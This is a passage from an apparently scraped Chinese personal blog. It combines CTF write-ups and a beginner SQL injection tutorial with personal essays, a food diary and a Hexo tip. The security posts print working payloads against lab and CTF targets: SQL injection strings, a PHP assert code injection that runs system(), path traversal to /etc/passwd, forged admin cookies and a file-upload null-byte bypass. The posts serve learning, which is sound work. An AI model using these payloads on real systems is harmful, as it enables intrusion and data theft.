r''';array&lt;set&lt;uint32_t&gt;, limit+1&gt; crcs;string stk;void dfs(uint32_t crc) &#123; if (crcs[stk.length()].count(crc ^ mask_crc32)) &#123; fprintf(stderr, \"crc found: 0x%08x: \\\"\", crc ^ mask_crc32); for (char c : stk) fprintf(stderr, isprint(c) &amp;&amp; (c != '\\\\') ? \"%c\" : \"\\\\x%02x\", c); fprintf(stderr, \"\\\"\\n\"); printf(\"%08x \", crc ^ mask_crc32); for (char c : stk) printf(\" %02x\", c); printf(\"\\n\"); &#125; if (stk.length() &lt; limit) &#123; for (char c : alphabet) &#123; stk.push_back(c); dfs(next_crc32(crc, c)); stk.pop_back(); &#125; &#125;&#125;int main() &#123;'''for crc, size in crcs: code += ' crcs[' + str(size) + '].insert(' + hex(crc) + ');\\n'code += r''' make_crc_table(); dfs(initial_crc32); return 0;&#125;'''import tempfileimport subprocesswith tempfile.TemporaryDirectory() as tmpdir: cppname = os.path.join(tmpdir, 'a.cpp') with open(cppname, 'w') as fh: fh.write(code) binname = os.path.join(tmpdir, 'a.out') print('compiling...', file=sys.stderr) p = subprocess.check_call([args.compiler, '-std=c++11', '-O3', '-o', binname, cppname]) print('searching...', file=sys.stderr) p = subprocess.Popen([binname], stdout=subprocess.PIPE) output, _ = p.communicate()print('done', file=sys.stderr)print(file=sys.stderr)result = collections.defaultdict(list)for line in output.decode().strip().split('\\n'): crc, *val = map(lambda x: int(x, 16), line.split()) result[( crc, len(val) )] += [ bytes(val) ]for key, crc in targets.items(): for s in result[crc]: print('%s : %s' % (key, repr(s)[1:])) 示例： 0x06 MORE还有很多压缩包的密码需要联系题中的其他文件来解，这个就不在本篇的讨论范围内了，故不再讨论。","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"}]},{"title":"NCTF WriteUp（二）","date":"2017-09-23T13:55:10.000Z","path":"2017/09/23/NCTF-2/","text":"下午又写了几个题，做点小笔记。 上传绕过URL: http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html 一个简易的上传界面，先传了个png格式的图片试水，得到回显：“必须上传成后缀名为php的文件才行啊!”。要同时满足这些条件，应该要用到截断，试了很多姿势都不行，于是开burp看了看： 留意到这个“/uploads/”，试试在后面加个”.php”，得到了这个： 下面就可以进行截断了。把刚才的语句改成”.php （末尾多个空格）”，然后去hex界面把对应位置的”20”改成”00”进行截断，Go。 起名字真难URL: http://chinalover.sinaapp.com/web12/index.php 直接给出了源码： 123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag; else echo 'access denied';?&gt; 可以看到这个函数做了一个对数字的判断，很巧的是number的值转16进制后为”0xccccccccc”，可以传入。于是payload便为”?key=0xccccccccc”。 sql injection 4URL: http://chinalover.sinaapp.com/web15/index.php TIP:反斜杠可以用来转义仔细查看相关函数的用法 F12有源码： 123456789101112131415function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125; 发现sql查询语句使用了分号，对于此类sql注入需要闭合分号。 先来看看这几个函数： get_magic_quotes_gpc(): 这个函数如果设置为”On”可以判断用户传入（如: post、get、cookie）的数据，增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符而产生的一系列错误。 stripslashes(): 这个函数则能删除由 addslashes() 函数添加的反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。 htmlentities(): 把字符转换为 HTML 实体。 由于使用了htmlentities()函数，所以无法使用分号来闭合。因此我们用反斜杠去逃出单引号的限制，利用它构造payload：?username=admin\\&amp;password= or 1%23，这样查询语句就变成了SELECT * FROM users WHERE name=&#39;admin\\&#39;AND pass=&#39; or 1#&#39;，即可拿到flag。","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"writeup","slug":"writeup","permalink":"https://icyris.github.io/tags/writeup/"}]},{"title":"从零开始的SQL注入（二）","date":"2017-07-26T07:56:10.000Z","path":"2017/07/26/sqli-2/","text":"熊孩子在数据库里吃糖到底是哪里出了问题！ 0x00 前言 今天我们讲讲一些基本的注入思路以及常见的注入类型。 0x01 什么是SQL注入呢？我们看看百度是怎么讲的： 所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 再来看看google是怎么说的： SQL攻击（英语：SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。 当然只看这些并不能很好地理解“何为SQL注入”这个问题。觉得涛涛的例子不错，就照着那个再来理解一次吧ouo。比如说我们写了一个简单的博客，每篇文章都有对应的序号以便读者查询，读者说想看第一篇文章，于是服务器就从数据库里拿出第一篇文章的数据返回给浏览器，浏览器把图片，文字显示给读者。这个过程用代码来表示大概是这个样子： Acaleph访问了：https://cyris.cn/show.php?id=1 （数字表示第几篇文章。）此时服务器的处理语句可能是这个样子：12$id = $_GET['id']; SELECT * FROM articles WHERE articles_id = 1 看起来似乎没什么问题呢，但是Acaleph比较调皮，她说：“我要看第二篇文章，然后把你的数据都删掉XD！”于是语句变成了：12$id = $_GET['id']; SELECT * FROM articles WHERE articles_id = 2 and drop db_articles 聪明的永远是人而不是程序，这里程序直接把id =2 and drop db_articles当作一条命令去执行了，而非一条查询语句，那么我们的数据库就被次了，Acaleph成功删库跑路。 上面的例子只是一个初步的认识，想了解更多就自行Google啦。 0x03 注入思路 基本流程123456查询字段数（order by）找出注入点获取数据库名（database()）获取表名获取字段名获取具体数据 下面说一下其实也不是很具体的做法吧： 1. 查询字段数主要是利用order by语句来查询。 ORDER BY 语句用于根据指定的列对结果集进行排序ORDER BY 语句默认按照升序对记录进行排序 还是用上面的那个例子，我们可以在?id = 1后面跟上order by 1（1可以是其他的数字），假如在尝试某个数字的时候出现了报错（或者是之前都能看到一些数据，到某个数字后不再显示了），就可以确定字段数啦。 2. 找出注入点在拿到字段数后就可以利用union语句来找出注入点了（可能会存在过滤），当然也有其他方法，在实例中讲吧。 3. 获取数据库名sql语句中的database()函数可以显示当前数据库名，用法和上一步差不多，不过是把第二步中找到的注入点的位置的数字改为database()传入。比如说，上一步中使用的语句是union select 1, 2, 3, 4，爆出来的字段位置是2，那这一步的语句就是union select 1, database(), 3, 4。 4. 获取表名这里讲一下information_schema这张表，它里面保存了MySQL服务器所有数据库信息，比如数据库名，数据库的表，表格里的数据类型与访问权限等。我们用得比较多的就是TABLES（表信息）和COLUMNS（列信息）了。而group_concat()这个函数可以将结果合并，操作原理可以搜一搜，相关文章挺多的。我们主要用这个函数来获取表名。 MySQL官方文档：https://dev.mysql.com/doc/refman/5.7/en/information-schema.html 5. 获取字段名还是通过group_concat()函数，利用COLUMNS表来获取字段名。 6. 获取具体数据表名和字段名都get到了，下面的操作就比较简单了。还是用上面的例子吧，比如一系列试探后我们得到了表名ctf和字段名flag，就可以构造语句union select 1, (select flag from ctf), 3, 4来获取具体的数据了。 当然以上都是一些比较基础的操作，实战过程中难免会遇到很多的防御措施，这时候就需要一些技巧来绕过了。 名为技巧的小家伙们记录一些有趣的绕过方式。 LoRexxar-关于sqli注入的特殊函数LoRexxar-SQL显错注入lightless-SQL Injection 的猥琐技巧 0x04 SQL注入类型一些常见的SQL注入类型。1234567字符型（最典型的就是单引号'了，当然单引号不是万能的，常常需要结合一些经验与技巧来判断。）数字型（1+1会被处理成2，在尝试时需要注意'+'要用'%2b'代替）Boolean-based blind SQL injection（布尔型注入）Error-based SQL injection（报错型注入）UNION query SQL injection（可联合查询注入）Stacked queries SQL injection（可多语句查询注入）Time-based blind SQL injection（基于时间延迟注入） 各种注入类型会在接下来的实例中仔细地讲一下。 0x05 给牛奶盒上盖子 这次主要整理了一些概括性的东西 —— 对SQLi的初步认识和理解。其中也还有很多不足的地方，要继续加油呢。下期开始就是各种注入方法的实例啦（正片总在三集后）。 参考文章： lightless的从零开始SQL注入系列一叶知秋的几篇关于SQL注入的文章","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"sqli","slug":"sqli","permalink":"https://icyris.github.io/tags/sqli/"}]},{"title":"从零开始的SQL注入（一）","date":"2017-07-18T11:01:03.000Z","path":"2017/07/18/sqli-labs/","text":"$ cat ~/Fate/SQLi 0x00 前言开了个新坑。在看了涛涛的从零开始SQL注入后萌生了自己做一个系列的想法。（当然要自己玩一遍才过瘾嘛(｡･∀･)ﾉﾞ） 长期不定时更，仅作为个人笔记。 0x01 搭建服务器环境 下载xampp包。(易于安装，集成了Apache+MySQL+PHP+PERL，更容易使用。) 安装完成后启动Apache和MySQL（启动报错可能是因为80/443端口占用，在/xampp/apache/conf/extra/httpd-ssl.conf修改下Listen就可以了。） 启动完成后查看：http://localhost:442/xampp/，页面正常则说明安装成功。（442改成自己设置的端口） 0x02 SQLi-Labs配置 下载实验环境：SQLi-Labs。 把源码包解压到\\xampp\\htdocs下，重命名为sqli-labs。 打开http://localhost:442/sqli-labs/，点下Setup/reset Database for labs建立数据库。（也可作恢复数据库用。） 来，回到之前的页面，选一个题试试：http://localhost:442/sqli-labs/Less-1/?id=1 注：如果xampp下载的是PHP 7+的版本，可能会存在数据库连接的问题，网上有相应的解决方案，视情况自行解决吧XD。","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"sqli","slug":"sqli","permalink":"https://icyris.github.io/tags/sqli/"}]},{"title":"觉得理性的人快乐嘛","date":"2017-07-12T12:34:52.000Z","path":"2017/07/12/the-seed/","text":"只是你不知道我的狂野。 一、靠在窗外的人 读着窗边的景初中高中的时候经常会在空间或者朋友圈发些简短的话，诸如“不是雪晚了，只是年早了（记某次终于到来的雪，很兴奋，看了以往的日历才发现，是那年年过得早，所以才有雪来得迟的感受）”，“把书夹在光里（第一次见到那种夹子式的移动台灯的时候，把它夹在了硬皮书上然后靠在床前阅读）”，类似的还有很多，似乎变成了动态圈的一股清流，也不求多少赞，不想多少评论，只是想说，就说了。（那时候也不会想到这些话会成为水母喜欢自己的一部分理由）。现在很少发朋友圈之类的，主要是多了些可以说话的人吧，表达的对象与地方都发生了些改变。当然不同的人会采取不同的表达方式，所以衍生出了各种各样的圈子，过得开心即可。 每个阶段的“回家”都是有不同的意义的。 其实一直很羡慕有弟弟妹妹的人，大概是“独生”带来的某种程度的孤独感太过真实了吧。于是可以说话的“人”，从小时候的玩具，到游戏里的熟人，到窗外的天空，云与太阳，到曾经觉得会合不来现在却无话不说的挚友，到水母玲，每个阶段都有独到的故事在。 这里没有提到父母或者各类长辈，不清楚其他家的情况所以不作大体的评价，不过对于我自己，其实在物质得到一定的满足之后，会转而追求一些精神上的东西，而这些是更偏向物质追求的那一代很难给予的，他们会以经验，以自己的想法告诉你，应该怎么去做，家长，孩子，男人，女人，这些的区别在他们的眼里有时候太过强烈了，以致于你做了一件你想做的事可能会被说，你不能这么做，你是男孩子所以要强硬不能柔软，你是女孩子所以不要经常出去玩，你是小孩不要听我们讲话，不要管大人的事，专心读书就好，之类，（这样看来女装反而是一种思想的解放呢hh）就比如不管大人的事，其实孩子很聪明，学语言的速度就比大人快上很多，这样的学习能力，以“大人的事”来限制一些思想的开拓，其实觉得挺可惜的（也算是之后很长一段时间不太爱和他们说话的原因吧）。 以前会觉得不舒服，会闹脾气，随意得不理他们，一是确实不喜欢一些做法和说法，二是前一段时间才想到的，可能觉得无论自己怎么耍性子他们都不会离开自己丢下自己，所以潜意识里助长了一些任性呢。好在自己也是个比较平静的人，不会太过生气，不会太过任性，即使偶尔有些意见的争执，不是无意义的大吵大闹就可以接受。以及，他们确实是爱着自己关心着自己的 —— 以他们自己的方式。虽然作为一个个体，我们拥有管理自己的情绪和释放自己属性的权利 —— 只是合适不合适的问题。比较“妥善”的释放，不仅可以最大限度地解压，也是一种成熟的体现吧。学会控制是门艺术，它不是对自己的压抑，反而是种引导式的增益。 对自己也好，对其他关心甚至爱着自己的人也好。 靠在窗外的人，读着窗边的景。 搬到新家以后，会经常靠在客厅的窗边看着窗外的天。没有任何建筑的遮挡，视野获得了最大程度的自由。会觉得离天空很近，离太阳很近，离风很近，离云很近，离飞鸟很近，离生命很近。他们每天走着不一样的轨迹，但却丰满而深刻。拍了很多这个位置这个视角下的照片，每一张都不一样，情理之中。不过这里不是说景色的搭配不一样，而是他们所展现的力量，是色彩的灵活搭配下深度展现给我，带给我震撼感的东西。 天空是会说话的，如果你用心说，如果你用心听。那段日子，虽然大人们看来是“很无聊的发呆”，自己却觉得是意外的充实与滋润。 二、交心前段时间回归了一下以前玩过的一款游戏，果然还是热爱着RPG呢。因为剧情和地图人设都觉得做得不错，就安利给了女友，一起玩了会儿，也算是了了一个心愿呢。惊喜的是她也很喜欢这款游戏，不过随着等级的上升，遇到使用第三方插件的玩家越来越多，不对，不应该称作玩家，而是商人吧。抢占着地图与道具，把正常玩家挤下线，并严重阻碍着任务的完成度。 这是款冷了很久的游戏，当初退出它就是因为过分的商业化，而代理商并没有解决问题的力量，不如说不愿去解决吧。吃相并不好看。好好的游戏体验，只能在回忆里体验到了。即使喜欢着游戏本身，女友也因为受不了这点，不出几日便删了游戏。有太多的脏话想说。然而该说的几年前就说了，现在能找到一些记忆里的体验就已经很棒了。 除了这款游戏，还有的比较深印象的是初中的时候逛着贴吧找到了[异次元服务器]，一个用服务器搭着MC进行游戏的小圈子。以前觉得弄服务器什么的很厉害，但是后来才知道其中大部分人是比自己还小的，也更说明了孩子的学习能力的强力呢。当然我在这里想说的不是游戏的体验，而是一些其他的东西。一起玩过游戏的人，有的已经结婚生子，有的还在积极备考，有的是和自己一样或者相似的人。很多人可能都没有见过面，但是现在还有着一些联系，很感动。在这种充斥着不信任的时代里，这种温暖显得难得可贵，即使隔着屏幕，也能感受到一些亲和。 我称这种体验为交心。 当然离我们更近的交心体验还是朋友间，恋人间的。嗯也借这个机会谈谈一些恋爱观与设想吧。 其实成长到现在，不仅是自己，整个社会的恋爱观都在发生着变化，从以前的连靠得很近都觉得是种羞耻的时代到了可以大胆去表达，表现爱的时代，觉得也是种进步呢，也是种解放。年轻人们有着自己的方式与理解去决定如何去爱，最主要的是如何去选择对象与对自己身体的开放程度，比如现在的勾肩搭背搂抱可能是以前的人所无法接受的呢。当然远不止这些。 这些概括起来大致是[选择权]的提升吧，说起来本该拥有的东西现在被赋予了或者说争取到了还觉得开心，其实有点奇怪的呢。 这世界，两个人，能相遇，不容易。 当谈及恋爱的时候，我觉得不管是在哪个年龄，都不该含着一种羞耻心，最常见的就是你比邻居家的某个哥哥姐姐要早有男票女票，你的爸妈可能会觉得有某种“不妥”，甚至对方到家里来玩都要遮遮掩掩不好意思，这本身就有一种不合理的成分在。爱的经营好比商业，甚至比经商还要复杂，那么人们是否会因为你年纪轻轻比周围的中年工作党还赚得多而感到羞耻嘛？显然不会，他们还会夸这样的你。那么为什么放到恋爱这边会有这样的差别呢，其实还是一种物质世界与精神世界的搭配不均，或者说某种传统的偏见束缚所引起的，那么爱与性的解放，其实还有很长一段路要走。我们所关注的，应该是如何去引导自己或者自己的孩子，去提升整场感情的质量，而非冠冕的“为了你好以xx为重不能这样不能这样”，这是种压制，而非利于他成长的体验。 有幸捕捉到一只有相近目标的女票，并不会觉得将来会因为专业的重合而使得乐趣与圈子重合而造成乐趣的减少，当然下一章任务的解锁与成就的体验会需要现在的一些努力与投入，听起来有点教条，但还是这个理呢XD。你没办法说，现在靠着家长享受着一些东西，以后也可以这样。无济于事可能来自于自己的无能为力，这种感觉会非常痛苦。 对于我们来说，积累一定的经验以后，会尝试跟着协会的学长去参加一些比赛，再到各地参加线下赛，去各地的同时，其实因为彼此的存在也会成为一种独特的旅行方式，途中自会产生很多有趣的小故事呢。也会认识更多有质量的人，水母也说，有了另一个人的陪伴以后，社交上也会有不一样的体验呢，于是一并期待着。喜欢着彼此，喜欢着技术与比赛，喜欢着旅行，整一条路都会有喜欢的东西，即使中途出现着小小的分歧，也如岔口生长不一的异花异景，观赏摆弄之后，再回到那条路上，会加成了一定程度的喜欢值也说不准呢。 长久的陪伴融合并不是让一个人去迁就另一个人，可能很多男生会觉得一直哄一直宠着女票就可以，很多人觉得以后肯定会这么做，然而这其实不是健康的感情，爱是双向的，你的温柔与包容是必须的，但是同时你吸引对方的，一定不是如何宠溺，而是你本身。带给她无限关怀的可能不止你一个人能做到，但是要牢牢得用自身去吸引她的，只有你能做到。如果对方一直没有什么亮点的话，你会觉得各种对自己的好都显得那么普通，而如果是不断吸引着自己的人呢，其实稍微对你的注意与关怀都会感觉像是上帝的恩赐一般，甚至整天的心情都是那么棒。 可以在做着不一样的事，可以有着不同认识的人，但是你会成为她的住所，会是她愿意回来且能感到安心的地方，你们之间可以有抱怨，但是没有猜疑；可以有嫌弃，但也有迷人的部分，仅此一人。每天重复着一样的动作，仅仅是吃饭睡觉一起上课，会显得疲倦，于是可以尝试着加些创意，因为有她，你有源源不断的点子，因为是她，所以你愿意去投入一定的时间去准备这些小惊喜，而在属于自己的时间，最大效率地完成学习，完成工作，成就自己。去打造深化自己拥有的也不断吸引着她的优点，去增强自己的能力以去更好地守护她，守护这段感情，守护自己。这个过程不会简单，其中必定会有不理解与小委屈，但是只要面对着对方的是真实的内心，这些都很容易解决。 也希望自己能够成长为可以独挡一面，成熟的人。 祝愿，祝福。 三、胡言乱语其实最近一静下心来就有点乱乱的，很多的坑要填，时间却不断压迫着，说到底还是有点怠惰了。突然对什么来了兴致就抓起来做一通，做得很浅，于是这里长一点那里长一点，技能树十分得脆，是一种体验性质，都点上尝尝鲜，然后又投入到焦急的升级中去，也只有在转完该转的职以后，才有心情去真正感受那些玩弄几天就兴致大减的技能，其实他们的光效很美。 在研究各种hexo主题，不断折腾的时候，突然觉得是不是对文章内容本身少了一点关注。的确我也很喜欢玩这些前端的东西，喜欢做出饱满却不乏雅致，有着很棒的浏览体验的东西，但是一定不是现在的这种学习模式。原因太简单，现在这种模式并不能把自己立起来，这是深切感受到的东西，在冲凉的时候越想越鼓的东西。 想起来yilia这个主题的作者Litten在设计这个theme的时候，初衷就是“多关注一点内容”。在打这些字的时候还在想如何去安排下一个阶段，那就先把这种不正常的急躁去除吧，实在不喜欢这种由“做得很浅”带来的心理体验。 抬头做人，低头做事。 以上。","tags":[{"name":"绿生","slug":"绿生","permalink":"https://icyris.github.io/tags/绿生/"},{"name":"卡萨布兰卡","slug":"卡萨布兰卡","permalink":"https://icyris.github.io/tags/卡萨布兰卡/"}]},{"title":"hexo博客图片问题解决办法","date":"2017-07-12T11:46:06.000Z","path":"2017/07/12/blog-picture-issue/","text":"关于hexo博客图片无法正常显示的问题的解决办法。 之前一直用的MarkdownPad2自带的添加图片按钮来添加图片（存储在hexo/source/imag里），但是经常会有显示不出的情况，不喜欢用各大图床，于是查了一波本地存储上传的方法，找到了一个插件来修正img标签以使图片正常显示。 参考自简书。 0x01 Asset设定确认首先确认_config.yml 中有 post_asset_folder:true。这时候每次hexo new会自动建立一个与文章同名的文件夹，我们可以把与该文章相关的所有资源都放到那个文件夹，来更方便得调用资源。 0x02 插件添加在hexo文件夹执行： npm install https://github.com/CodeFalling/hexo-asset-image –save 0x03 图片添加完成安装后新建一个文件试试，发现在.md文件同级目录下会有一个同名文件夹。比如我们新建了一个文件blog-picture-issue.md，然后在同名文件夹里放张图：1.png。 之后在原图片引用语句的括号里写入： blog-picture-issue/1.PNG 就能看到正常显示的图片了： 注：[]里是图片的名称，可不写。 0x04 issued这样的操作以后生成的html是：1&lt;img src=\"/2017/07/12/blog-picture-issue/1.PNG\" alt=\"logo\"&gt; 而非之前的：1&lt;img src=\"blog-picture-issue/1.PNG\" alt=\"logo\"&gt;” 使得图片正常显示。","tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://icyris.github.io/tags/Hexo/"}]},{"title":"OpenCTF WriteUp","date":"2017-07-03T09:01:47.000Z","path":"2017/07/03/OpenCTF/","text":"软件嘉年华部分题的题解。 http://hdopen.xctf.org.cn/ 一、WEBweb125URL: http://202.112.51.184:8001 参考链接： https://github.com/bl4de/ctf/blob/master/2016/CSAW_CTF_2016/mfw/mfw_web125.md 在about页面看到：1234I used: - Git - PHP - Bootstrap 先从/.git里拖个源码，这里用的GitHack： 1GitHack.py http://202.112.51.184:8001/.git/ flag.php里的： 1234&lt;?php// TODO// $FLAG = '';?&gt; index.php里的关键代码： 1234567891011121314151617181920&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt;&lt;?php require_once $file;?&gt; 比较菜只能做到这里。之后一叶知秋利用assert函数引起的代码注射构造payload：1?page='.system(\"cd /var/www/html/;git diff;\").'about 得到12345678910diff --git a/templates/flag.php b/templates/flag.phpindex f8c9436..1d552ec 100644--- a/templates/flag.php+++ b/templates/flag.php@@ -1,4 +1 @@-&lt;?php-// TODO-// $FLAG = '';-?&gt;+&lt;?php $FLAG=\"xctf&#123;392dba36b0998deac2ed87ceca63c4b2&#125;\"; ?&gt; 关于payload里的”/var/www/html/“，可以看看https://stackoverflow.com/questions/16197663/what-is-var-www-html web150, 400URL: http://202.112.51.184:8002/ 参考链接： https://thegoonies.rocks/csaw-2016-wtf-sh-web/ https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh web150和web400这两题在上面的链接里都有详细的解答过程，这里稍微记录一下。 题目里有个登陆页面，想到passwd文件存放在/etc目录下，尝试构造 1http://202.112.51.184:8002/profile.wtf?user=../../../../../../etc/passwd 得到响应： 1root:x:0:0:root:/root:/bin/bash's posts: 再尝试读取 1http://202.112.51.184:8002/post.wtf?post=../users/ 拉下来的列表里有一条包含admin的hash值与id的信息： 1234&lt;div class=\"post\"&gt;&lt;span class=\"post-poster\"&gt;Posted by &lt;a href=\"/profile.wtf?user=Cv3uk\"&gt;admin&lt;/a&gt;&lt;/span&gt;&lt;span class=\"post-title\"&gt;822ec9ffd8e2e720b59e75d5c9047d690747af3e&lt;/span&gt;&lt;span class=\"post-body\"&gt;tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA==&lt;/span&gt; 进入admin相关页面1http://202.112.51.184:8002/profile.wtf?user=Cv3uk 然后伪造下cookie： 1. USERNAME = admin 2. __cfduid = 822ec9ffd8e2e720b59e75d5c9047d690747af3e 3. TOKEN = tENOEU4RlJqSGPJn1O/eNASiC89NL699v96lgpg1muh5jqIq/oDjonRho8mvT6wB30xNnloGtRUBRBbT8ub0MA== 最后在页面底部拿到flag。 400分的题水平不够没写出来，看看上面的wp吧。 web200URL: http://202.112.51.184:8000/cgi-bin/forms.pl原题： https://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id 没太看懂解法，还在问土土师傅，之后补充。 二、Cryptocrypto 100小明今天去妹纸家开Party,而妹纸却给他出了一个谜语,说只要他能答出来,她就会答应小明一个要求. 这是妹纸给小明的谜语序列:EW91X2FYZV9HX2DVB2RFYM95= 适当把大写字母改成小写然后base64解一下就可以了。 crypto 150URL: http://hdopen.xctf.org.cn/media/task/58f1ec51-bf9e-43fa-bd77-c1cc423e3cf4.rar 分享一份veritas501关于带密码压缩包题的思路整理：http://veritas501.space/2017/06/23/给你压缩包却不给你密码的人到底在想什么/#more 这题采用的是crc32碰撞法。","tags":[{"name":"ctf","slug":"ctf","permalink":"https://icyris.github.io/tags/ctf/"},{"name":"writeup","slug":"writeup","permalink":"https://icyris.github.io/tags/writeup/"}]},{"title":"菠萝牛肉饭","date":"2017-07-02T03:54:20.000Z","path":"2017/07/02/tea-maker/","text":"菠萝，青菜，牛肉，米饭，芝麻，番茄蛋汤。 一、番茄蛋汤精灵挺喜欢香港岛的老板的，一个带点广东口音的大叔，店里有鱼有猫，靠近门口的地方有张小桌子，上面堆了些有种年代意象的玩物，平时戴着细框眼镜，很是友好，买单时会跟你说谢谢，很平静的那种，静到直深心骨，声音有种大漠般的饱满，总之光那几声谢谢，也会再一次进店享食。 在这里用餐还是挺奢侈的，两个人可以吃到50+，但是东西量很足，第一次来点菜难免会浪费，量足的同时味也很足，整个店都有老板的那种气质，印象比较深的便是那份菠萝牛肉饭，汁液包裹着菠萝青菜与牛肉，这些食材的味道又锁在了汤汁里，交错相关，很是融洽。米饭虽也在一个盘子里却保持着很难得的干净，夫人会很喜欢这样的米饭，有着它该有的独立剔透的味道。我比较喜欢喝汤，所以这份饭到最后基本会被我用汤汁浇淋全身，米香即被困在了一层透明丝滑之下。吃得很愉快。老板娘还很贴心的送了份番茄蛋汤，味道也很出色。说到番茄蛋汤，不得不提一下番茄蛋汤精灵@Acaleph，靠一碗汤就可以让我吃完一顿饭的水母宝贝。 “成为优秀厨师的诀窍就是…遇上一个足以让你想要将自己所有的料理，都献给她的女人。” —— 食戟之灵 最早来这里是橙子介绍的，喝的生滚粥，肉片煮得很有力度，量也很够，一份粥两个人也可以吃饱。里边还有几片生菜，妖娆得躺在粥里，忍不住想揪出来咬几口。生滚粥当然主要品的是粥啦，粥也是很棒，记得连续吃了好几天，它与盛放它的黑色砂锅有着相近的味道，也表现着老板的那种气质——饱满沧桑却近人有力。 在这里，食物有着它该有的味道。在吃腻了外卖的那种干燥后，很长一段时间胃口处于闭塞的状态，偶然点的一份菠萝牛肉饭，解锁了一些新的体验。 二、点亮宿舍的柠檬由随手翻倒的满杯的柠檬绿茶所释放的意象怪物。 某家店的饮品里常常会放入大只的果块果片，基本啃完了水果茶水也就剩下一点，放了冰块的东西得趁冷喝，热了化了淡了，这杯饮品迷人的地方就少了，那种有点先前的调味但是又掺杂着融化的人工冰块的塑料味的东西，不是很能接受，以后也不会。 急着开电脑打翻了杯刚买的柠檬茶，不开心，其实最近遇到了很多不顺心的事，知道要去调整，却惰于烦躁与抱怨。倒翻的绿茶很无意地点亮了这个地方，擦干地面的时候，有很舒服的味道充盈着这间屋子，降温消燥，忙着期末考好久未拖的地，也趁着这个机会干净了一把。 看似坏的东西也不一定全是坏事，也可能是以一小部分的坏抵消了一大部分的坏也说不准。 看起来有点像毒鸡汤，于是上个删除线。不会喜欢鸡汤类的东西，并不是那么适合大部分人，有时候还会变成强扭某种境遇的措辞，看着不是很舒服。当然翻倒的柠檬水的清香是真，这个体验是真实存在的，也的确愉悦了一会儿，再过一会儿味道没了，便又回到了一股燥热中。以及地面似乎没拖干净，黏，乎，乎……","tags":[{"name":"绿生","slug":"绿生","permalink":"https://icyris.github.io/tags/绿生/"},{"name":"柠檬之涩","slug":"柠檬之涩","permalink":"https://icyris.github.io/tags/柠檬之涩/"},{"name":"番茄蛋汤","slug":"番茄蛋汤","permalink":"https://icyris.github.io/tags/番茄蛋汤/"}]},{"title":"NCTF WriteUp","date":"2017-06-01T08:28:25.000Z","path":"2017/06/01/NCTF/","text":"南邮NCTF训练平台里一些题的wp。 http://ctf.nuptsast.com/ 签到2URL: http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php 得到这样一个页面： 尝试输入：zhimakaimen但是发现输入到倒数第二个e就输入不下去了，F12：1234&lt;p&gt;输入框：&lt;input value=\"\" name=\"text1\" maxlength=\"10\" type=\"password\"&gt;&lt;br&gt;请输入口令：zhimakaimen &lt;input value=\"开门\" type=\"submit\"&gt;&lt;/p&gt; 把maxlength改成100，重新输入口令得到flag。 这题不是WEBURL: http://chinalover.sinaapp.com/web2/index.html 打开后是一张gif猫，下载到本地。记事本打开得到flag： 层层递进URL: http://chinalover.sinaapp.com/web3/ 进去是个企业网站，一开始F12没啥发现，看了WP才知道要访问： http://chinalover.sinaapp.com/web3/404.html再去F12看看发现有一个404.html的页面状态码是304，也是个思路吧，没找仔细….. 得到源码：123456789101112131415161718192021222324&lt;td&gt;&lt;!-- Placed at the end of the document so the pages load faster --&gt;&lt;!-- &lt;script src=\"./js/jquery-n.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-c.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-f.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-&#123;.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-t.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-h.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-s.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-_.7.2.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/jquery-i.7.2.min.js\"&gt;&lt;/script&gt;&lt;script 